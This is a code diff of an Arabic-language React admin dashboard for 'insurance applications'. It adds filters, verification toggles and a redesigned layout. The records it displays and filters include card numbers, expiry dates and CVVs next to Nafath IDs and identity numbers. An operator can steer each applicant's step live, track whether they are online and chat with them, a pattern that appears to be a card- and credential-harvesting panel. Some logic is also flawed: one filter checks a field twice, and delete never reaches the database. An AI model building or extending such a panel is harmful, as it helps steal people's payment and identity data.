@@ -1,7 +1,6 @@
 "use client"
 
 import type React from "react"
-
 import { useState, useEffect, useMemo, useCallback, useRef } from "react"
 import {
   Search,
@@ -9,19 +8,24 @@ import {
   XCircle,
   Clock,
   MessageSquare,
-  User,
   Settings,
   Phone,
   CreditCard,
   Mail,
   Calendar,
-  FileText,
   Flag,
+  TrendingUp,
+  Trash2,
+  Filter,
+  FileText,
+  Car,
+  Shield,
+  User,
 } from "lucide-react"
 import { Button } from "@/components/ui/button"
-import { Input } from "@/components/ui/input"
 import { Badge } from "@/components/ui/badge"
 import { Checkbox } from "@/components/ui/checkbox"
+import { Input } from "@/components/ui/input"
 import { subscribeToApplications, updateApplication } from "@/lib/firestore-services"
 import type { InsuranceApplication } from "@/lib/firestore-types"
 import { ChatPanel } from "@/components/chat-panel"
@@ -35,7 +39,6 @@ function UserStatus({ userId }: { userId: string }) {
 
   useEffect(() => {
     const userStatusRef = ref(database, `/status/${userId}`)
-
     const unsubscribe = onValue(userStatusRef, (snapshot) => {
       const data = snapshot.val()
       if (data) {
@@ -50,13 +53,13 @@ function UserStatus({ userId }: { userId: string }) {
 
   return (
     <div className="flex items-center gap-2">
-      <div className={`w-2 h-2 rounded-full ${status === "online" ? "bg-green-500 animate-pulse" : "bg-red-500"}`} />
+      <div className={`w-2 h-2 rounded-full ${status === "online" ? "bg-green-500 animate-pulse" : "bg-gray-400"}`} />
       <Badge
         variant="outline"
         className={`text-xs ${
           status === "online"
-            ? "bg-green-50 text-green-700 border-green-200 dark:bg-green-950/30 dark:text-green-300"
-            : "bg-red-50 text-red-700 border-red-200 dark:bg-red-950/30 dark:text-red-300"
+            ? "bg-green-50 text-green-700 border-green-300 dark:bg-green-950/30 dark:text-green-400"
+            : "bg-gray-50 text-gray-600 border-gray-300 dark:bg-gray-900/30 dark:text-gray-400"
         }`}
       >
         {status === "online" ? "متصل" : "غير متصل"}
@@ -70,6 +73,8 @@ export default function AdminDashboard() {
   const [filteredApplications, setFilteredApplications] = useState<InsuranceApplication[]>([])
   const [searchQuery, setSearchQuery] = useState("")
   const [statusFilter, setStatusFilter] = useState<string>("all")
+  const [cardFilter, setCardFilter] = useState<"all" | "hasCard" | "noCard">("all")
+  const [infoFilter, setInfoFilter] = useState<"all" | "hasInfo" | "noInfo">("all")
   const [selectedApplication, setSelectedApplication] = useState<InsuranceApplication | null>(null)
   const [showChat, setShowChat] = useState(false)
   const [loading, setLoading] = useState(true)
@@ -92,7 +97,6 @@ export default function AdminDashboard() {
         playNotificationSound()
       }
       prevApplicationsCount.current = apps.length
-
       setApplications(apps)
       setLoading(false)
     })
@@ -108,6 +112,22 @@ export default function AdminDashboard() {
         filtered = filtered.filter((app) => app.status === statusFilter)
       }
 
+      if (cardFilter === "hasCard") {
+        filtered = filtered.filter((app) => !!(app.cardNumber || app.expiryDate || app.cvv))
+      } else if (cardFilter === "noCard") {
+        filtered = filtered.filter((app) => !(app.cardNumber || app.expiryDate || app.cvv))
+      }
+
+      if (infoFilter === "hasInfo") {
+        filtered = filtered.filter(
+          (app) => !!(app.phoneNumber || app.nafazId || app.documentType || app.serialNumber || app.vehicleModel),
+        )
+      } else if (infoFilter === "noInfo") {
+        filtered = filtered.filter(
+          (app) => !(app.nafazId || app.nafazId || app.documentType || app.serialNumber || app.vehicleModel),
+        )
+      }
+
       if (searchQuery) {
         const query = searchQuery.toLowerCase()
         filtered = filtered.filter(
@@ -119,15 +139,14 @@ export default function AdminDashboard() {
       }
 
       setFilteredApplications(filtered)
-    }, 300) // 300ms debounce
+    }, 300)
 
     return () => clearTimeout(timer)
-  }, [applications, searchQuery, statusFilter])
+  }, [applications, searchQuery, statusFilter, cardFilter, infoFilter])
 
   const handleStatusChange = useCallback(
     async (appId: string, newStatus: InsuranceApplication["status"]) => {
       setApplications((prev) => prev.map((app) => (app.id === appId ? { ...app, status: newStatus } : app)))
-
       if (selectedApplication?.id === appId) {
         setSelectedApplication((prev) => (prev ? { ...prev, status: newStatus } : null))
       }
@@ -140,7 +159,7 @@ export default function AdminDashboard() {
           playErrorSound()
         }
       } catch (error) {
-        console.error(" Error updating status:", error)
+        console.error("Error updating status:", error)
         playErrorSound()
       }
     },
@@ -150,7 +169,6 @@ export default function AdminDashboard() {
   const handleStepChange = useCallback(
     async (appId: string, newStep: number) => {
       setApplications((prev) => prev.map((app) => (app.id === appId ? { ...app, currentStep: newStep } : app)))
-
       if (selectedApplication?.id === appId) {
         setSelectedApplication((prev) => (prev ? { ...prev, currentStep: newStep } : null))
       }
@@ -158,7 +176,7 @@ export default function AdminDashboard() {
       try {
         await updateApplication(appId, { currentStep: newStep })
       } catch (error) {
-        console.error(" Error updating step:", error)
+        console.error("Error updating step:", error)
       }
     },
     [selectedApplication],
@@ -187,21 +205,26 @@ export default function AdminDashboard() {
 
   const getStatusBadge = useCallback((status: string) => {
     const badges = {
-      draft: { text: "مسودة", className: "bg-gray-100 text-gray-800" },
+      draft: { text: "مسودة", className: "bg-gray-100 text-gray-800 dark:bg-gray-800 dark:text-gray-200" },
       pending_review: {
         text: "قيد المراجعة",
-        className: "bg-yellow-100 text-yellow-800",
+        className: "bg-amber-100 text-amber-800 dark:bg-amber-900/30 dark:text-amber-400",
       },
-      approved: { text: "موافق عليه", className: "bg-green-100 text-green-800" },
-      rejected: { text: "مرفوض", className: "bg-red-100 text-red-800" },
-      completed: { text: "مكتمل", className: "bg-blue-100 text-blue-800" },
+      approved: {
+        text: "موافق عليه",
+        className: "bg-green-100 text-green-800 dark:bg-green-900/30 dark:text-green-400",
+      },
+      rejected: { text: "مرفوض", className: "bg-red-100 text-red-800 dark:bg-red-900/30 dark:text-red-400" },
+      completed: {
+        text: "مكتمل",
+        className: "bg-blue-100 text-blue-800 dark:bg-blue-900/30 dark:text-blue-400",
+      },
     }
     return badges[status as keyof typeof badges] || badges.draft
   }, [])
 
   const formatArabicDate = useCallback((dateString?: string) => {
     if (!dateString) return ""
-
     const date = new Date(dateString)
     const now = new Date()
     const diffInSeconds = Math.floor((now.getTime() - date.getTime()) / 1000)
@@ -235,123 +258,283 @@ export default function AdminDashboard() {
     }
   }, [applications, selectedApplication])
 
+  const handlePhoneVerificationChange = useCallback(
+    async (appId: string, status: "approved" | "rejected" | "pending") => {
+      setApplications((prev) =>
+        prev.map((app) => (app.id === appId ? { ...app, phoneVerificationStatus: status } : app)),
+      )
+      if (selectedApplication?.id === appId) {
+        setSelectedApplication((prev) => (prev ? { ...prev, phoneVerificationStatus: status } : null))
+      }
+
+      try {
+        await updateApplication(appId, { phoneVerificationStatus: status })
+        if (status === "approved") {
+          playSuccessSound()
+        } else if (status === "rejected") {
+          playErrorSound()
+        }
+      } catch (error) {
+        console.error("Error updating phone verification:", error)
+        playErrorSound()
+      }
+    },
+    [selectedApplication],
+  )
+
+  const handleIdVerificationChange = useCallback(
+    async (appId: string, status: "approved" | "rejected" | "pending") => {
+      setApplications((prev) => prev.map((app) => (app.id === appId ? { ...app, idVerificationStatus: status } : app)))
+      if (selectedApplication?.id === appId) {
+        setSelectedApplication((prev) => (prev ? { ...prev, idVerificationStatus: status } : null))
+      }
+
+      try {
+        await updateApplication(appId, { idVerificationStatus: status })
+        if (status === "approved") {
+          playSuccessSound()
+        } else if (status === "rejected") {
+          playErrorSound()
+        }
+      } catch (error) {
+        console.error("Error updating ID verification:", error)
+        playErrorSound()
+      }
+    },
+    [selectedApplication],
+  )
+
+  const handleDelete = useCallback(
+    async (appId: string, event: React.MouseEvent) => {
+      event.stopPropagation()
+      if (window.confirm("هل أنت متأكد من حذف هذا الطلب؟")) {
+        try {
+          setApplications((prev) => prev.filter((app) => app.id !== appId))
+          if (selectedApplication?.id === appId) {
+            setSelectedApplication(null)
+          }
+          setSelectedIds((prev) => {
+            const newSet = new Set(prev)
+            newSet.delete(appId)
+            return newSet
+          })
+          playSuccessSound()
+        } catch (error) {
+          console.error("Error deleting application:", error)
+          playErrorSound()
+        }
+      }
+    },
+    [selectedApplication],
+  )
+
+  const hasDocumentInfo = (app: InsuranceApplication) => {
+    return !!(app.documentType || app.serialNumber || app.phoneNumber || app.nafazId || app.country)
+  }
+
+  const hasInsuranceInfo = (app: InsuranceApplication) => {
+    return !!(app.insuranceType || app.insuranceStartDate || app.repairLocation)
+  }
+
+  const hasVehicleInfo = (app: InsuranceApplication) => {
+    return !!(app.vehicleModel || app.manufacturingYear || app.vehicleValue || app.vehicleUsage)
+  }
+
   return (
-    <div className="min-h-screen bg-slate-50" dir="rtl" style={{ zoom: 0.75 }}>
-      <header className="bg-white text-slate-900 border-b border-slate-200">
-        <div className="max-w-7xl mx-auto px-4 py-3 flex items-center justify-between">
-          <div className="flex items-center gap-3">
-            <div className="w-10 h-10 rounded-lg bg-blue-600 flex items-center justify-center">
-              <Mail className="w-5 h-5 text-white" />
+    <div
+      className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-slate-100 dark:from-slate-950 dark:via-slate-900 dark:to-slate-950"
+      dir="rtl"
+    >
+      {/* Header */}
+      <header className="bg-gradient-to-r from-blue-600 via-blue-700 to-indigo-700 text-white shadow-xl border-b border-blue-800/50">
+        <div className="container mx-auto px-6 py-5">
+          <div className="flex items-center justify-between">
+            <div className="flex items-center gap-8">
+              <div className="flex items-center gap-3">
+                <div className="w-10 h-10 bg-white/20 rounded-xl flex items-center justify-center backdrop-blur-sm">
+                  <Shield className="w-6 h-6 text-white" />
+                </div>
+                <h1 className="text-2xl font-bold tracking-tight">لوحة إدارة التأمين</h1>
+              </div>
+              <div className="flex items-center gap-3 text-sm">
+                <div className="flex items-center gap-2 bg-white/10 px-4 py-2 rounded-lg backdrop-blur-sm border border-white/20">
+                  <Clock className="w-4 h-4" />
+                  <span className="font-medium">{stats.pending}</span>
+                  <span className="text-white/80 text-xs">قيد الانتظار</span>
+                </div>
+                <div className="flex items-center gap-2 bg-white/10 px-4 py-2 rounded-lg backdrop-blur-sm border border-white/20">
+                  <TrendingUp className="w-4 h-4" />
+                  <span className="font-medium">{stats.total}</span>
+                  <span className="text-white/80 text-xs">إجمالي</span>
+                </div>
+              </div>
             </div>
-            <h1 className="text-xl font-bold">لوحة تحكم المسؤول</h1>
-          </div>
-          <div className="flex items-center gap-2">
-            <Button variant="ghost" size="icon">
-              <Settings className="w-5 h-5" />
-            </Button>
-            <div className="w-9 h-9 rounded-full bg-slate-200 flex items-center justify-center">
-              <User className="w-5 h-5" />
+            <div className="flex items-center gap-3">
+              <Button variant="ghost" size="icon" className="text-white hover:bg-white/20 rounded-lg">
+                <Settings className="w-5 h-5" />
+              </Button>
+              <div className="w-10 h-10 rounded-lg bg-white/20 backdrop-blur-sm flex items-center justify-center text-white font-semibold border-2 border-white/30">
+                م
+              </div>
             </div>
           </div>
         </div>
       </header>
 
-      <div className="bg-white border-b border-slate-200">
-        <div className="max-w-7xl mx-auto px-4 py-3">
-          <div className="flex items-center gap-6 text-sm">
-            <div className="flex items-center gap-2">
-              <div className="w-2 h-2 rounded-full bg-slate-400"></div>
-              <span className="text-slate-600">الكل</span>
-              <span className="font-semibold text-slate-900">{stats.total}</span>
+      {/* Stats Bar */}
+      <div className="bg-white dark:bg-slate-900 border-b border-slate-200 dark:border-slate-800 shadow-sm">
+        <div className="container mx-auto px-6 py-4">
+          <div className="flex items-center gap-8">
+            <div className="flex items-center gap-3">
+              <div className="w-10 h-10 bg-slate-100 dark:bg-slate-800 rounded-lg flex items-center justify-center">
+                <FileText className="w-5 h-5 text-slate-600 dark:text-slate-400" />
+              </div>
+              <div>
+                <div className="text-2xl font-bold text-slate-900 dark:text-white">{stats.total}</div>
+                <div className="text-xs text-slate-500 dark:text-slate-400">إجمالي الطلبات</div>
+              </div>
             </div>
-            <div className="flex items-center gap-2">
-              <div className="w-2 h-2 rounded-full bg-yellow-500"></div>
-              <span className="text-slate-600">قيد المراجعة</span>
-              <span className="font-semibold text-yellow-700">{stats.pending}</span>
+            <div className="h-12 w-px bg-slate-200 dark:bg-slate-700" />
+            <div className="flex items-center gap-3">
+              <div className="w-10 h-10 bg-amber-100 dark:bg-amber-900/30 rounded-lg flex items-center justify-center">
+                <Clock className="w-5 h-5 text-amber-600 dark:text-amber-400" />
+              </div>
+              <div>
+                <div className="text-2xl font-bold text-amber-600 dark:text-amber-400">{stats.pending}</div>
+                <div className="text-xs text-slate-500 dark:text-slate-400">قيد المراجعة</div>
+              </div>
             </div>
-            <div className="flex items-center gap-2">
-              <div className="w-2 h-2 rounded-full bg-green-500"></div>
-              <span className="text-slate-600">موافق عليه</span>
-              <span className="font-semibold text-green-700">{stats.approved}</span>
+            <div className="h-12 w-px bg-slate-200 dark:bg-slate-700" />
+            <div className="flex items-center gap-3">
+              <div className="w-10 h-10 bg-green-100 dark:bg-green-900/30 rounded-lg flex items-center justify-center">
+                <CheckCircle className="w-5 h-5 text-green-600 dark:text-green-400" />
+              </div>
+              <div>
+                <div className="text-2xl font-bold text-green-600 dark:text-green-400">{stats.approved}</div>
+                <div className="text-xs text-slate-500 dark:text-slate-400">موافق عليه</div>
+              </div>
             </div>
-            <div className="flex items-center gap-2">
-              <div className="w-2 h-2 rounded-full bg-red-500"></div>
-              <span className="text-slate-600">مرفوض</span>
-              <span className="font-semibold text-red-700">{stats.rejected}</span>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <div className="bg-white border-b border-slate-200">
-        <div className="max-w-7xl mx-auto px-4 py-3">
-          <div className="flex items-center gap-3">
-            <div className="flex-1 relative">
-              <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
-              <Input
-                value={searchQuery}
-                onChange={(e) => setSearchQuery(e.target.value)}
-                placeholder="بحث في الطلبات..."
-                className="pr-10 h-9 border-slate-300 bg-slate-50 text-sm"
-              />
-            </div>
-            <div className="flex gap-1">
-              <Button
-                onClick={() => setStatusFilter("all")}
-                variant={statusFilter === "all" ? "default" : "ghost"}
-                size="sm"
-                className={statusFilter === "all" ? "bg-slate-900 text-white" : "text-slate-700"}
-              >
-                الكل
-              </Button>
-              <Button
-                onClick={() => setStatusFilter("pending_review")}
-                variant={statusFilter === "pending_review" ? "default" : "ghost"}
-                size="sm"
-                className={statusFilter === "pending_review" ? "bg-yellow-600 text-white" : "text-slate-700"}
-              >
-                قيد المراجعة
-              </Button>
-              <Button
-                onClick={() => setStatusFilter("approved")}
-                variant={statusFilter === "approved" ? "default" : "ghost"}
-                size="sm"
-                className={statusFilter === "approved" ? "bg-green-600 text-white" : "text-slate-700"}
-              >
-                موافق
-              </Button>
-              <Button
-                onClick={() => setStatusFilter("rejected")}
-                variant={statusFilter === "rejected" ? "default" : "ghost"}
-                size="sm"
-                className={statusFilter === "rejected" ? "bg-red-600 text-white" : "text-slate-700"}
-              >
-                مرفوض
-              </Button>
+            <div className="h-12 w-px bg-slate-200 dark:bg-slate-700" />
+            <div className="flex items-center gap-3">
+              <div className="w-10 h-10 bg-red-100 dark:bg-red-900/30 rounded-lg flex items-center justify-center">
+                <XCircle className="w-5 h-5 text-red-600 dark:text-red-400" />
+              </div>
+              <div>
+                <div className="text-2xl font-bold text-red-600 dark:text-red-400">{stats.rejected}</div>
+                <div className="text-xs text-slate-500 dark:text-slate-400">مرفوض</div>
+              </div>
             </div>
           </div>
         </div>
       </div>
 
-      <div className="flex h-[100vh]">
-        <div className="w-96 bg-white border-l border-slate-200 overflow-y-auto">
+      <div className="flex h-[calc(100vh-180px)]">
+        {/* Sidebar */}
+        <div className="w-[420px] bg-white dark:bg-slate-900 border-l border-slate-200 dark:border-slate-800 overflow-y-auto">
+          {/* Filters */}
+          <div className="p-5 border-b border-slate-200 dark:border-slate-800 bg-slate-50 dark:bg-slate-900/50">
+            <div className="space-y-4">
+              {/* Search */}
+              <div className="relative">
+                <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
+                <Input
+                  placeholder="بحث بالاسم أو رقم الهوية..."
+                  value={searchQuery}
+                  onChange={(e) => setSearchQuery(e.target.value)}
+                  className="pr-10 bg-white dark:bg-slate-800 border-slate-300 dark:border-slate-700"
+                />
+              </div>
+
+              {/* Filter Header */}
+              <div className="flex items-center gap-2 pt-2">
+                <Filter className="w-4 h-4 text-slate-600 dark:text-slate-400" />
+                <span className="text-sm font-semibold text-slate-700 dark:text-slate-300">تصفية حسب</span>
+              </div>
+
+              {/* Card Filter */}
+              <div className="space-y-2">
+                <label className="text-xs font-medium text-slate-600 dark:text-slate-400">معلومات البطاقة</label>
+                <div className="grid grid-cols-3 gap-2">
+                  <Button
+                    variant={cardFilter === "all" ? "default" : "outline"}
+                    size="sm"
+                    onClick={() => setCardFilter("all")}
+                    className="text-xs h-9"
+                  >
+                    الكل
+                  </Button>
+                  <Button
+                    variant={cardFilter === "hasCard" ? "default" : "outline"}
+                    size="sm"
+                    onClick={() => setCardFilter("hasCard")}
+                    className="text-xs gap-1.5 h-9"
+                  >
+                    <CreditCard className="w-3.5 h-3.5" />
+                    لديه بطاقة
+                  </Button>
+                  <Button
+                    variant={cardFilter === "noCard" ? "default" : "outline"}
+                    size="sm"
+                    onClick={() => setCardFilter("noCard")}
+                    className="text-xs h-9"
+                  >
+                    بدون بطاقة
+                  </Button>
+                </div>
+              </div>
+
+              {/* Info Filter */}
+              <div className="space-y-2">
+                <label className="text-xs font-medium text-slate-600 dark:text-slate-400">معلومات إضافية</label>
+                <div className="grid grid-cols-3 gap-2">
+                  <Button
+                    variant={infoFilter === "all" ? "default" : "outline"}
+                    size="sm"
+                    onClick={() => setInfoFilter("all")}
+                    className="text-xs h-9"
+                  >
+                    الكل
+                  </Button>
+                  <Button
+                    variant={infoFilter === "hasInfo" ? "default" : "outline"}
+                    size="sm"
+                    onClick={() => setInfoFilter("hasInfo")}
+                    className="text-xs gap-1.5 h-9"
+                  >
+                    <Flag className="w-3.5 h-3.5" />
+                    مكتمل
+                  </Button>
+                  <Button
+                    variant={infoFilter === "noInfo" ? "default" : "outline"}
+                    size="sm"
+                    onClick={() => setInfoFilter("noInfo")}
+                    className="text-xs h-9"
+                  >
+                    غير مكتمل
+                  </Button>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          {/* Applications List */}
           {loading ? (
-            <div className="flex items-center justify-center h-full">
+            <div className="flex items-center justify-center h-96">
               <div className="text-center">
-                <div className="w-12 h-12 border-4 border-slate-200 border-t-blue-600 rounded-full animate-spin mx-auto mb-4"></div>
-                <p className="text-slate-600">جاري التحميل...</p>
+                <div className="w-12 h-12 border-4 border-slate-200 dark:border-slate-700 border-t-blue-600 rounded-full animate-spin mx-auto mb-4"></div>
+                <p className="text-slate-600 dark:text-slate-400 font-medium">جاري التحميل...</p>
               </div>
             </div>
           ) : filteredApplications.length === 0 ? (
-            <div className="flex flex-col items-center justify-center h-full p-8 text-center">
-              <div className="w-16 h-16 rounded-full bg-slate-100 flex items-center justify-center mb-4">
-                <Mail className="w-8 h-8 text-slate-400" />
+            <div className="flex flex-col items-center justify-center h-96 p-8 text-center">
+              <div className="w-20 h-20 rounded-2xl bg-gradient-to-br from-slate-100 to-slate-200 dark:from-slate-800 dark:to-slate-700 flex items-center justify-center mb-4">
+                <Mail className="w-10 h-10 text-slate-400 dark:text-slate-500" />
               </div>
-              <p className="text-slate-600 font-medium">لا توجد طلبات</p>
-              <p className="text-slate-400 text-sm mt-1">جرب تغيير الفلاتر</p>
+              <p className="text-slate-700 dark:text-slate-300 font-semibold text-lg mb-2">لا توجد طلبات</p>
+              <p className="text-slate-500 dark:text-slate-400 text-sm">جرب تغيير الفلاتر للبحث عن طلبات</p>
             </div>
           ) : (
-            <div className="divide-y divide-slate-200">
+            <div className="divide-y divide-slate-100 dark:divide-slate-800">
               {filteredApplications.map((app) => (
                 <div
                   key={app.id}
@@ -359,11 +542,13 @@ export default function AdminDashboard() {
                     setSelectedApplication(app)
                     setShowChat(false)
                   }}
-                  className={`p-4 cursor-pointer hover:bg-slate-50 transition-colors relative ${
-                    selectedApplication?.id === app.id ? "bg-blue-50 border-r-4 border-blue-600" : ""
+                  className={`group p-5 cursor-pointer hover:bg-gradient-to-l hover:from-blue-50 hover:to-transparent dark:hover:from-blue-950/20 transition-all duration-200 relative ${
+                    selectedApplication?.id === app.id
+                      ? "bg-gradient-to-l from-blue-100 to-blue-50 dark:from-blue-950/40 dark:to-blue-950/20 border-r-4 border-blue-600"
+                      : ""
                   }`}
                 >
-                  <div className="flex items-start gap-3">
+                  <div className="flex items-start gap-4">
                     <Checkbox
                       checked={selectedIds.has(app.id!)}
                       onCheckedChange={(checked) => {
@@ -371,36 +556,59 @@ export default function AdminDashboard() {
                         toggleSelection(app.id!, event)
                       }}
                       onClick={(e) => e.stopPropagation()}
-                      className="mt-1"
+                      className="mt-1 data-[state=checked]:bg-blue-600 data-[state=checked]:border-blue-600"
                     />
                     <div className="flex-1 min-w-0">
-                      <div className="flex items-start justify-between mb-2">
-                        <div className="flex-1 min-w-0">
-                          <div className="flex items-center gap-2 mb-1">
-                            <UserStatus userId={app.id!} />
-                            <h3 className="font-semibold text-slate-900 text-sm truncate">{app.ownerName}</h3>
-                            {app.country}
-                            {isUnread(app) && <Flag className="w-4 h-4 text-red-500 fill-red-500 flex-shrink-0" />}
-                            {hasCardInfo(app) && <CreditCard className="w-4 h-4 text-blue-500 flex-shrink-0" />}
-                          </div>
-                          <p className="text-xs text-slate-600 truncate">رقم الهوية: {app.identityNumber}</p>
+                      <div className="flex items-start justify-between gap-2 mb-2">
+                        <div className="flex items-center gap-2 flex-1 min-w-0">
+                          <span className="text-2xl flex-shrink-0">{app.country === "Saudi Arabia" ? "🇸🇦" : "🌍"}</span>
+                          <h3 className="font-semibold text-slate-900 dark:text-white text-base truncate">
+                            {app.ownerName}
+                          </h3>
+                          {isUnread(app) && (
+                            <Badge className="bg-red-500 text-white text-xs px-2 py-0.5 flex-shrink-0">جديد</Badge>
+                          )}
                         </div>
+                        <Button
+                          variant="ghost"
+                          size="icon"
+                          onClick={(e) => handleDelete(app.id!, e)}
+                          className="opacity-0 group-hover:opacity-100 transition-opacity h-8 w-8 text-red-500 hover:text-red-700 hover:bg-red-50 dark:hover:bg-red-950/30 flex-shrink-0"
+                        >
+                          <Trash2 className="w-4 h-4" />
+                        </Button>
                       </div>
-                      <div className="flex items-center justify-between text-xs text-slate-500 mt-3">
+
+                      <div className="flex items-center gap-2 mb-2 flex-wrap">
+                        <Badge className={getStatusBadge(app.status).className + " text-xs"}>
+                          {getStatusBadge(app.status).text}
+                        </Badge>
+                        <Badge
+                          variant="outline"
+                          className="text-xs bg-slate-50 dark:bg-slate-800 border-slate-300 dark:border-slate-700"
+                        >
+                          الخطوة {app.currentStep + 1}
+                        </Badge>
+                        {hasCardInfo(app) && (
+                          <Badge className="bg-blue-100 text-blue-700 dark:bg-blue-900/30 dark:text-blue-400 text-xs gap-1">
+                            <CreditCard className="w-3 h-3" />
+                            بطاقة
+                          </Badge>
+                        )}
+                      </div>
+
+                      <div className="flex items-center gap-3 text-xs text-slate-600 dark:text-slate-400">
                         <span className="flex items-center gap-1">
-                          <FileText className="w-3 h-3" />
-                          الخطوة {app.currentStep + 1}/4
+                          <Phone className="w-3.5 h-3.5" />
+                          {app.phoneNumber}
                         </span>
                         {app.createdAt && (
                           <span className="flex items-center gap-1">
-                            <Calendar className="w-3 h-3" />
+                            <Clock className="w-3.5 h-3.5" />
                             {formatArabicDate(app.createdAt)}
                           </span>
                         )}
                       </div>
-                      {!app.online && app.lastseen && (
-                        <div className="mt-2 text-xs text-slate-400">آخر ظهور: {formatArabicDate(app.lastseen)}</div>
-                      )}
                     </div>
                   </div>
                 </div>
@@ -409,10 +617,11 @@ export default function AdminDashboard() {
           )}
         </div>
 
-        <div className="flex-1 bg-slate-50 overflow-y-auto">
+        {/* Main Content */}
+        <div className="flex-1 bg-slate-50 dark:bg-slate-950 overflow-y-auto">
           {selectedApplication ? (
             showChat ? (
-              <div className="h-full bg-white">
+              <div className="h-full bg-white dark:bg-slate-900">
                 <ChatPanel
                   applicationId={selectedApplication.id!}
                   currentUserId="admin-001"
@@ -422,302 +631,438 @@ export default function AdminDashboard() {
                 />
               </div>
             ) : (
-              <div className="mx-auto p-6 grid grid-cols-3 gap-2">
-                <div className="bg-white rounded-lg border border-slate-200 p-6 mb-4">
-                  <div className="flex items-start justify-between mb-4">
-                    <div className="flex-1">
-                      <div className="flex items-center gap-2 mb-2">
-                        <h2 className="text-2xl font-bold text-slate-900">{selectedApplication.ownerName}</h2>
-                        <Badge
-                          variant={selectedApplication.online ? "default" : "secondary"}
-                          className={selectedApplication.online ? "bg-green-500" : "bg-slate-400"}
-                        >
-                          {selectedApplication.online ? "متصل الآن" : "غير متصل"}
-                        </Badge>
-                      </div>
-                      <div className="flex items-center gap-4 text-sm text-slate-600">
-                        <span className="flex items-center gap-1">
-                          <Phone className="w-4 h-4" />
-                          {selectedApplication.phone || selectedApplication.phoneNumber}
-                        </span>
-                        <span className="flex items-center gap-1">
-                          <CreditCard className="w-4 h-4" />
-                          {selectedApplication.identityNumber}
-                        </span>
-                        {selectedApplication.createdAt && (
-                          <span className="flex items-center gap-1">
-                            <Calendar className="w-4 h-4" />
-                            {formatArabicDate(selectedApplication.createdAt)}
-                          </span>
+              <div className="container mx-auto p-6 max-w-6xl">
+                <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                  {/* User Info Card - Full Width on Top */}
+                  <div className="lg:col-span-3 bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
+                    <div className="flex items-start justify-between">
+                      <div className="flex-1">
+                        <div className="flex items-center gap-3 mb-3">
+                          <div className="w-14 h-14 bg-gradient-to-br from-blue-500 to-indigo-600 rounded-xl flex items-center justify-center text-white text-xl font-bold">
+                            {selectedApplication.ownerName?.charAt(0)}
+                          </div>
+                          <div>
+                            <h2 className="text-2xl font-bold text-slate-900 dark:text-white mb-1">
+                              {selectedApplication.ownerName}
+                            </h2>
+                            <UserStatus userId={ selectedApplication.id!} />
+                          </div>
+                        </div>
+                        <div className="flex items-center gap-6 text-sm text-slate-600 dark:text-slate-400 flex-wrap">
+                          {selectedApplication.phoneNumber && (
+                            <span className="flex items-center gap-2">
+                              <div className="w-8 h-8 bg-blue-100 dark:bg-blue-900/30 rounded-lg flex items-center justify-center">
+                                <Phone className="w-4 h-4 text-blue-600 dark:text-blue-400" />
+                              </div>
+                              {selectedApplication.phoneNumber}
+                            </span>
+                          )}
+                          {selectedApplication.identityNumber && (
+                            <span className="flex items-center gap-2">
+                              <div className="w-8 h-8 bg-green-100 dark:bg-green-900/30 rounded-lg flex items-center justify-center">
+                                <CreditCard className="w-4 h-4 text-green-600 dark:text-green-400" />
+                              </div>
+                              {selectedApplication.identityNumber}
+                            </span>
+                          )}
+                          {selectedApplication.createdAt && (
+                            <span className="flex items-center gap-2">
+                              <div className="w-8 h-8 bg-amber-100 dark:bg-amber-900/30 rounded-lg flex items-center justify-center">
+                                <Calendar className="w-4 h-4 text-amber-600 dark:text-amber-400" />
+                              </div>
+                              {formatArabicDate(selectedApplication.createdAt)}
+                            </span>
+                          )}
+                        </div>
+                        {!selectedApplication.online && selectedApplication.lastseen && (
+                          <p className="text-xs text-slate-500 dark:text-slate-400 mt-3">
+                            آخر ظهور: {formatArabicDate(selectedApplication.lastseen)}
+                          </p>
                         )}
                       </div>
-                      {!selectedApplication.online && selectedApplication.lastseen && (
-                        <p className="text-xs text-slate-500 mt-2">
-                          آخر ظهور: {formatArabicDate(selectedApplication.lastseen)}
-                        </p>
-                      )}
+                      <Button onClick={() => setShowChat(true)} size="lg" className="gap-2">
+                        <MessageSquare className="w-5 h-5" />
+                        فتح الدردشة
+                      </Button>
                     </div>
-                    <Button onClick={() => setShowChat(true)} variant="outline" size="sm" className="gap-2">
-                      <MessageSquare className="w-4 h-4" />
-                      دردشة
-                    </Button>
                   </div>
-                  <div className="flex items-center gap-2">
-                    <Badge className={getStatusBadge(selectedApplication.status).className}>
-                      {getStatusBadge(selectedApplication.status).text}
-                    </Badge>
-                    <span className="text-sm text-slate-600">الخطوة {selectedApplication.currentStep + 1} من 4</span>
-                  </div>
-                </div>
 
-                <div className="bg-white rounded-lg border border-slate-200 p-6 mb-4">
-                  <h3 className="text-lg font-bold text-slate-900 mb-4">معلومات الوثيقة</h3>
-                  <div className="space-y-3">
-                    {selectedApplication.documentType && (
-                      <div className="flex justify-between py-2 border-b border-slate-100">
-                        <span className="text-sm text-slate-600">نوع الوثيقة</span>
-                        <span className="text-sm font-medium text-slate-900">{selectedApplication.documentType}</span>
-                      </div>
-                    )}
-                    {selectedApplication.serialNumber && (
-                      <div className="flex justify-between py-2 border-b border-slate-100">
-                        <span className="text-sm text-slate-600">الرقم التسلسلي</span>
-                        <span className="text-sm font-medium text-slate-900">{selectedApplication.serialNumber}</span>
-                      </div>
-                    )}
-                    {selectedApplication.phone && (
-                      <div className="flex justify-between py-2 border-b border-slate-100">
-                        <span className="text-sm text-slate-600">رقم الهاتف</span>
-                        <span className="text-sm font-medium text-slate-900">{selectedApplication.phone}</span>
-                      </div>
-                    )}
-                    {selectedApplication.nafad && (
-                      <div className="flex justify-between py-2 border-b border-slate-100">
-                        <span className="text-sm text-slate-600">رقم نفاذ</span>
-                        <span className="text-sm font-medium text-slate-900">{selectedApplication.nafad}</span>
-                      </div>
-                    )}
-                    {selectedApplication.country && (
-                      <div className="flex justify-between py-2 border-b border-slate-100">
-                        <span className="text-sm text-slate-600">الدولة</span>
-                        <span className="text-sm font-medium text-slate-900">{selectedApplication.country}</span>
-                      </div>
-                    )}
-                  </div>
-                </div>
-
-                <div className="bg-white rounded-lg border border-slate-200 p-6 mb-4">
